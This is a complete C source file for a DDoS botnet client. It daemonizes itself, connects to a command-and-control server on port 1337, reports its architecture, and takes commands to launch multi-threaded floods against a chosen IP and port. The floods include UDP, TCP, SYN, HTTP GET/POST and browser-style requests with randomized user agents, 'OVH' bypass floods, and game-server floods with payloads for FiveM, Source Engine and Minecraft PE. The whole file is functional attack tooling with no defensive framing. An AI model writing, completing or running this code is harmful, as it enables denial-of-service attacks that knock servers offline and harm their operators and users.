#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/stat.h>

// Configuration
#define C2_ADDRESS ""
#define C2_PORT    1337

// Global types and structures
typedef struct {
    volatile int stop;
} stop_event_t;

typedef struct attack_node {
    pthread_t thread;
    stop_event_t *stop_event;
    char username[64];
    struct attack_node *next;
} attack_node_t;

typedef struct {
    char method[32];
    char ip[64];
    int port;
    time_t end_time;
    stop_event_t *stop_event;
} attack_args_t;

// Attack list (Linked list implementation of user_attacks)
attack_node_t *user_attacks_head = NULL;
pthread_mutex_t list_mutex = PTHREAD_MUTEX_INITIALIZER;

// Payload para FiveM (servidores de GTA V)
unsigned char payload_fivem[] = "\xff\xff\xff\xffgetinfo xxx\x00\x00\x00";
// Payload para VSE (servidores diversos)
unsigned char payload_vse[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
// Payload para MCPE (Minecraft PE)
unsigned char payload_mcpe[] = "\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73";
// Payload HEXadecimal
unsigned char payload_hex[] = "\x55\x55\x55\x55\x00\x00\x00\x01";

int hex_vals[] = {2, 4, 8, 16, 32, 64, 128};
int PACKET_SIZES[] = {1024, 2048};

const char *base_user_agents[] = {
    "Mozilla/%.1f (Windows; U; Windows NT %s; en-US; rv:%.1f.%d) Gecko/%d%d Firefox/%.1f.%d",
    "Mozilla/%.1f (Windows; U; Windows NT %s; en-US; rv:%.1f.%d) Gecko/%d%d Chrome/%.1f.%d",
    "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%d (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%d",
    "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%d (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%d",
    "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%d (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%d",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
};

char* rand_ua() {
    static char ua_buf[512];
    int choice = rand() % 8;
    const char *nt_versions[] = {"5.1", "6.1", "10.0"};
    
    if (choice < 2) {
        sprintf(ua_buf, base_user_agents[choice], 
                5.0 + (float)rand()/(float)(RAND_MAX/5.0), 
                nt_versions[rand()%3], 
                5.0 + (float)rand()/(float)(RAND_MAX/5.0), rand()%10, 
                2000 + rand()%26, 10 + rand()%90, 
                30.0 + (float)rand()/(float)(RAND_MAX/70.0), rand()%10);
    } else if (choice < 5) {
        sprintf(ua_buf, base_user_agents[choice], 
                5.0 + (float)rand()/(float)(RAND_MAX/5.0), 
                500.0 + (float)rand()/(float)(RAND_MAX/100.0), rand()%10, 
                7 + rand()%9, rand()%9 + 1, 
                500.0 + (float)rand()/(float)(RAND_MAX/100.0), rand()%10);
    } else {
        strcpy(ua_buf, base_user_agents[choice]);
    }
    return ua_buf;
}

char* get_architecture() {
    static struct utsname buffer;
    if (uname(&buffer) != 0) {
        return "unknown";
    }
    return buffer.machine;
}

void generate_end(char *buf, int length) {
    const char *chara = "\n\r";
    for(int i = 0; i < length; i++) {
        buf[i] = chara[rand() % 2];
    }
    buf[length] = '\0';
}

void get_random_bytes(char *buf, int length) {
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd != -1) {
        read(fd, buf, length);
        close(fd);
    } else {
        for(int i = 0; i < length; i++) buf[i] = (char)(rand() % 256);
    }
}

// Prototypes for attack functions
void attack_hex(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_udp_bypass(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_tcp_bypass(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_tcp_udp_bypass(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_syn(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_vse(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_mcpe(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_fivem(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_http_get(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_http_post(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_browser(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_ovh_tcp(char *ip, int port, time_t secs, stop_event_t *stop_event);
void attack_ovh_udp(char *ip, int port, time_t secs, stop_event_t *stop_event);

void attack_ovh_tcp(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        int s2 = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) { close(s); close(s2); continue; }
        connect(s2, (struct sockaddr*)&addr, sizeof(addr));

        for (int i = 0; i < 7; i++) {
            for (int j = 0; j < 7; j++) {
                char random_part[2049];
                get_random_bytes(random_part, 2048);
                const char *paths[] = {"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\"};
                for (int p = 0; p < 4; p++) {
                    char end[5]; generate_end(end, 4);
                    char packet[4096];
                    int len = sprintf(packet, "PGET %s%.*s HTTP/1.1\nHost: %s:%d%s", paths[p], 2048, random_part, ip, port, end);
                    for (int k = 0; k < 10; k++) {
                        send(s, packet, len, 0);
                        send(s2, packet, len, 0);
                    }
                }
            }
        }
        close(s); close(s2);
    }
}

void attack_ovh_udp(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    int s = socket(AF_INET, SOCK_DGRAM, 0);

    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        for (int i = 0; i < 7; i++) {
            for (int j = 0; j < 7; j++) {
                char random_part[2049];
                get_random_bytes(random_part, 2048);
                const char *paths[] = {"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\"};
                for (int p = 0; p < 4; p++) {
                    char end[5]; generate_end(end, 4);
                    char packet[4096];
                    int len = sprintf(packet, "PGET %s%.*s HTTP/1.1\nHost: %s:%d%s", paths[p], 2048, random_part, ip, port, end);
                    for (int k = 0; k < 10; k++) {
                        sendto(s, packet, len, 0, (struct sockaddr*)&addr, sizeof(addr));
                    }
                }
            }
        }
    }
    close(s);
}

void attack_fivem(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        sendto(s, payload_fivem, sizeof(payload_fivem)-1, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(s);
}

void attack_mcpe(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        sendto(s, payload_mcpe, sizeof(payload_mcpe)-1, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(s);
}

void attack_vse(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        sendto(s, payload_vse, sizeof(payload_vse)-1, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(s);
}

void attack_hex(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        sendto(s, payload_hex, sizeof(payload_hex)-1, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(s);
}

void attack_udp_bypass(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        int packet_size = PACKET_SIZES[rand() % 2];
        char *packet = malloc(packet_size);
        get_random_bytes(packet, packet_size);
        sendto(s, packet, packet_size, 0, (struct sockaddr*)&addr, sizeof(addr));
        free(packet);
    }
    close(s);
}

void attack_tcp_bypass(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        int packet_size = PACKET_SIZES[rand() % 2];
        char *packet = malloc(packet_size);
        get_random_bytes(packet, packet_size);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            while (time(NULL) < secs && !stop_event->stop) {
                if (send(s, packet, packet_size, 0) < 0) break;
            }
        }
        free(packet);
        close(s);
    }
}

void attack_tcp_udp_bypass(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        int packet_size = PACKET_SIZES[rand() % 2];
        char *packet = malloc(packet_size);
        get_random_bytes(packet, packet_size);
        int is_tcp = rand() % 2;
        int s;
        if (is_tcp) {
            s = socket(AF_INET, SOCK_STREAM, 0);
            if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) { free(packet); close(s); continue; }
        } else {
            s = socket(AF_INET, SOCK_DGRAM, 0);
        }
        while (time(NULL) < secs && !stop_event->stop) {
            if (is_tcp) {
                if (send(s, packet, packet_size, 0) < 0) break;
            } else {
                if (sendto(s, packet, packet_size, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) break;
            }
        }
        free(packet);
        close(s);
    }
}

void attack_syn(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    connect(s, (struct sockaddr*)&addr, sizeof(addr));
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        int packet_size = PACKET_SIZES[rand() % 2];
        char *packet = malloc(packet_size);
        get_random_bytes(packet, packet_size);
        send(s, packet, packet_size, 0);
        free(packet);
    }
    close(s);
}

void attack_http_get(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            while (time(NULL) < secs && !stop_event->stop) {
                char request[1024];
                int len = sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", ip, rand_ua());
                if (send(s, request, len, 0) < 0) break;
            }
        }
        close(s);
    }
}

void attack_http_post(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            while (time(NULL) < secs && !stop_event->stop) {
                const char *payload = "username=admin&password=password123&email=admin@example.com&submit=login";
                char headers[2048];
                int len = sprintf(headers, "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %zu\r\nConnection: keep-alive\r\n\r\n%s", 
                                  ip, rand_ua(), strlen(payload), payload);
                if (send(s, headers, len, 0) < 0) break;
            }
        }
        close(s);
    }
}

void attack_browser(char *ip, int port, time_t secs, stop_event_t *stop_event) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    while (time(NULL) < secs) {
        if (stop_event->stop) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        struct timeval timeout; timeout.tv_sec = 5; timeout.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            char request[2048];
            int len = sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n",
                              ip, rand_ua());
            send(s, request, len, 0);
        }
        close(s);
    }
}

void *lunch_attack(void *args) {
    attack_args_t *a = (attack_args_t*)args;
    if (strcmp(a->method, ".HEX") == 0) attack_hex(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".UDP") == 0) attack_udp_bypass(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".TCP") == 0) attack_tcp_bypass(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".MIX") == 0) attack_tcp_udp_bypass(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".SYN") == 0) attack_syn(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".VSE") == 0) attack_vse(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".MCPE") == 0) attack_mcpe(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".FIVEM") == 0) attack_fivem(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".HTTPGET") == 0) attack_http_get(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".HTTPPOST") == 0) attack_http_post(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".BROWSER") == 0) attack_browser(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".OVHTCP") == 0) attack_ovh_tcp(a->ip, a->port, a->end_time, a->stop_event);
    else if (strcmp(a->method, ".OVHUDP") == 0) attack_ovh_udp(a->ip, a->port, a->end_time, a->stop_event);
    
    free(a);
    return NULL;
}

void start_attack(char *method, char *ip, int port, int duration, int thread_count, char *username) {
    stop_event_t *stop_event = malloc(sizeof(stop_event_t));
    stop_event->stop = 0;
    time_t end_time = time(NULL) + duration;

    for (int i = 0; i < thread_count; i++) {
        attack_args_t *args = malloc(sizeof(attack_args_t));
        strcpy(args->method, method);
        strcpy(args->ip, ip);
        args->port = port;
        args->end_time = end_time;
        args->stop_event = stop_event;

        pthread_t t;
        pthread_create(&t, NULL, lunch_attack, args);
        pthread_detach(t);

        pthread_mutex_lock(&list_mutex);
        attack_node_t *node = malloc(sizeof(attack_node_t));
        node->thread = t;
        node->stop_event = stop_event;
        strcpy(node->username, username);
        node->next = user_attacks_head;
        user_attacks_head = node;
        pthread_mutex_unlock(&list_mutex);
    }
}

void stop_attacks(char *username) {
    pthread_mutex_lock(&list_mutex);
    attack_node_t **curr = &user_attacks_head;
    while (*curr) {
        if (strcmp((*curr)->username, username) == 0) {
            (*curr)->stop_event->stop = 1;
            attack_node_t *tmp = *curr;
            *curr = (*curr)->next;
            free(tmp);
        } else {
            curr = &((*curr)->next);
        }
    }
    pthread_mutex_unlock(&list_mutex);
}

void daemonize() {
    pid_t pid = fork();
    
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    
    if (pid > 0) {
        // Parent process exits
        exit(EXIT_SUCCESS);
    }
    
    // Child process becomes session leader
    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }
    
    // Ignore terminal I/O signals
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    // Fork again to ensure we're not a session leader
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    
    // Change working directory to root
    chdir("/");
    
    // Set file mode creation mask
    umask(0);
    
    // Close all open file descriptors
    int fd;
    for (fd = sysconf(_SC_OPEN_MAX); fd > 0; fd--) {
        close(fd);
    }
    
    // Redirect stdin, stdout, stderr to /dev/null
    stdin = fopen("/dev/null", "r");
    stdout = fopen("/dev/null", "w+");
    stderr = fopen("/dev/null", "w+");
}

void main_logic() {
    int c2 = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(c2, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_ADDRESS, &serv_addr.sin_addr);

    while (1) {
        if (connect(c2, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
            char buffer[1024];
            while (1) {
                int n = recv(c2, buffer, sizeof(buffer)-1, 0);
                if (n <= 0) break;
                buffer[n] = '\0';
                if (strstr(buffer, "Username")) {
                    char *arch = get_architecture();
                    send(c2, arch, strlen(arch), 0);
                    break;
                }
            }
            while (1) {
                int n = recv(c2, buffer, sizeof(buffer)-1, 0);
                if (n <= 0) break;
                buffer[n] = '\0';
                if (strstr(buffer, "Password")) {
                    send(c2, "\xff\xff\xff\xff\75", 5, 0);
                    break;
                }
            }
            break;
        } else {
            sleep(120);
        }
    }

    while (1) {
        char buffer[1024];
        int n = recv(c2, buffer, sizeof(buffer)-1, 0);
        if (n <= 0) break;
        buffer[n] = '\0';
        
        char *args[10];
        int argc = 0;
        char *token = strtok(buffer, " \r\n");
        while(token && argc < 10) {
            args[argc++] = token;
            token = strtok(NULL, " \r\n");
        }
        
        if (argc == 0) continue;
        for(int i=0; args[0][i]; i++) if(args[0][i]>='a' && args[0][i]<='z') args[0][i]-=32;

        if (strcmp(args[0], "PING") == 0) {
            send(c2, "PONG", 4, 0);
        } else if (strcmp(args[0], "STOP") == 0 && argc > 1) {
            stop_attacks(args[1]);
        } else if (argc >= 5) {
            char *method = args[0];
            char *ip = args[1];
            int port = atoi(args[2]);
            int secs = atoi(args[3]);
            int threads = atoi(args[4]);
            char *username = (argc >= 6) ? args[5] : "default";
            start_attack(method, ip, port, secs, threads, username);
        }
    }
    close(c2);
    main_logic();
}

int main() {
    srand(time(NULL));
    
    // Daemonize the process
    daemonize();
    
    // Run the main logic
    main_logic();
    
    return 0;
}